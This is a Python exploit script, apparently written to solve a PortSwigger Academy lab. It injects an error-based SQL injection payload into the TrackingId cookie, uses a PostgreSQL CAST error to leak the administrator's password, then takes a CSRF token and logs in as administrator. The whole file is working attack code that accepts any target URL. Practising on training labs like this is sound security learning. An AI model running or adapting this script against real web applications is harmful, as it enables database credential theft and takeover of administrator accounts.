#!/usr/bin/python3
"""
PortSwigger Lab Solver
Visible error-based SQL injection (cookie injection + CAST error leak)
+ auto-login as administrator
"""
import sys
import re
import argparse
import httpx
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Interface:
    def __init__(self):
        self.red    = '\033[91m'
        self.green  = '\033[92m'
        self.white  = '\033[37m'
        self.yellow = '\033[93m'
        self.bold   = '\033[1m'
        self.end    = '\033[0m'

    def header(self):
        print('\n    >> Visible error-based SQL injection (CAST leak)')
        print('    >> by PortSwigger Academy\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}\u2713{self.end}] {self.bold}{message}{self.end}")


output   = Interface()
PROXY_URL    = "http://127.0.0.1:8080"
TARGET_USER  = "administrator"

# ---------------------------------------------------------------------------
# Payload builder
# ---------------------------------------------------------------------------
# Match the exact format Burp sends — spaces as '+', bare '--' at the end:
#   TrackingId='+AND+1%3dCAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--
#
# Do NOT use urllib.parse.quote() here; that would encode '+' as '%2B' and
# change the semantics.  We build the string manually so every character
# stays identical to what the working Burp request carries.
# ---------------------------------------------------------------------------
SQLI_PAYLOAD = (
    "'+AND+1%3dCAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--"
)


# --- Response parser -------------------------------------------------------
def extract_password(body: str):
    """Extract the leaked password from the PostgreSQL CAST error message."""
    patterns = [
        r'invalid input syntax for type integer:\s*"([^"]+)"',
        r"invalid input syntax for type integer:\s*'([^']+)'",
        r'invalid input syntax for \w+:\s*"([^"]+)"',
        r'cannot cast .+ "([^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, body, re.IGNORECASE)
        if m:
            return m.group(1)
    return None


def is_lab_solved(body: str) -> bool:
    return "is-solved" in body or "<p>Solved</p>" in body


# --- Stage 1: SQLi exploit -------------------------------------------------
def sqli_cookie_inject(client: httpx.Client, url: str):
    # Set the Cookie header manually so the raw payload string reaches the
    # server unmodified (httpx's cookie jar would re-encode special chars).
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/146.0.0.0 Safari/537.36"
        ),
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/avif,image/webp,image/apng,*/*;q=0.8,"
            "application/signed-exchange;v=b3;q=0.7"
        ),
        "Accept-Language":        "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "Referer":                f"{url}/",
        "Cookie":                 f"TrackingId={SQLI_PAYLOAD}",
    }

    output.info(f"Target   : {url}/")
    output.info(f"Payload  : TrackingId={SQLI_PAYLOAD}")

    try:
        # follow_redirects=False keeps the raw 500 response intact so we
        # can read the PostgreSQL error before any redirect swallows it.
        r = client.get(url + "/", headers=headers, follow_redirects=False)
    except httpx.RequestError as e:
        output.error(f"Request error: {e}")
        return None

    output.info(f"HTTP {r.status_code}  ({len(r.content)} bytes)")
    return r.text


def dump_credentials(body: str):
    if not body:
        output.error("Empty response body.")
        return None

    if is_lab_solved(body):
        output.success("Lab status: Solved (banner detected)")

    password = extract_password(body)

    print()
    output.info("Error message snippet:")
    print("-" * 60)
    found = False
    for line in body.splitlines():
        if any(k in line for k in ("ERROR", "invalid input", "syntax error")):
            print(line.strip())
            found = True
    if not found:
        print("(no ERROR/syntax line found in response)")
    print("-" * 60)
    print()

    if password:
        output.success(f"Username : {TARGET_USER}")
        output.success(f"Password : {password}")
        return password

    output.warning(
        "Password could not be extracted. "
        "Dumping response body (first 3000 chars) for debugging:"
    )
    print("-" * 60)
    print(body[:3000])
    print("-" * 60)
    return None


# --- Stage 2: Login flow ---------------------------------------------------
def get_csrf_token(client: httpx.Client, url: str):
    """GET /login and extract the CSRF token from input[name='csrf']."""
    try:
        r = client.get(url + "/login")
    except httpx.RequestError as e:
        output.error(f"Failed to GET /login: {e}")
        return None

    if r.status_code != 200:
        output.error(f"GET /login returned HTTP {r.status_code}")
        return None

    soup = BeautifulSoup(r.text, "html.parser")
    token_input = soup.find("input", attrs={"name": "csrf"})
    if not token_input or not token_input.get("value"):
        output.error("CSRF token not found on /login page.")
        return None

    return token_input["value"]


def login_as_administrator(client: httpx.Client, url: str, password: str):
    csrf = get_csrf_token(client, url)
    if not csrf:
        return False

    output.info(f"CSRF token : {csrf}")

    try:
        r = client.post(
            url + "/login",
            data={"csrf": csrf, "username": TARGET_USER, "password": password},
        )
    except httpx.RequestError as e:
        output.error(f"Login request error: {e}")
        return False

    return "Log out" in r.text or "/my-account" in str(r.url)


# --- CLI -------------------------------------------------------------------
def parse_args():
    parser = argparse.ArgumentParser(
        description="PortSwigger Visible error-based SQLi via TrackingId cookie",
    )
    parser.add_argument("url",    help="Target URL (https://...)")
    parser.add_argument("--proxy", action="store_true",
                        help=f"Route traffic via {PROXY_URL}")
    return parser.parse_args()


# --- Main ------------------------------------------------------------------
def main():
    output.header()
    args = parse_args()

    url = args.url.strip().rstrip('/')
    if not url.startswith(("http://", "https://")):
        output.error("URL must start with http:// or https://")
        sys.exit(1)

    proxy = PROXY_URL if args.proxy else None
    if proxy:
        output.warning(f"Routing via proxy {proxy}")

    output.info("Triggering CAST error to leak administrator password...")

    with httpx.Client(
        proxy=proxy,
        verify=False,
        http2=False,
        follow_redirects=True,
        timeout=httpx.Timeout(15.0, connect=10.0),
    ) as client:

        # Stage 1: inject SQLi via TrackingId cookie -> leak password
        body     = sqli_cookie_inject(client, url)
        password = dump_credentials(body)

        if not password:
            output.error("Aborting: no password could be extracted.")
            sys.exit(1)

        # Stage 2: login with extracted credentials
        print()
        output.info(f"Attempting login as {TARGET_USER}...")
        if login_as_administrator(client, url, password):
            output.success(f"Successfully logged in as {TARGET_USER}!")
            output.success(f"Access: {url}/my-account")
        else:
            output.error("Login failed. Check the password or the CSRF flow.")
            sys.exit(1)


if __name__ == "__main__":
    main()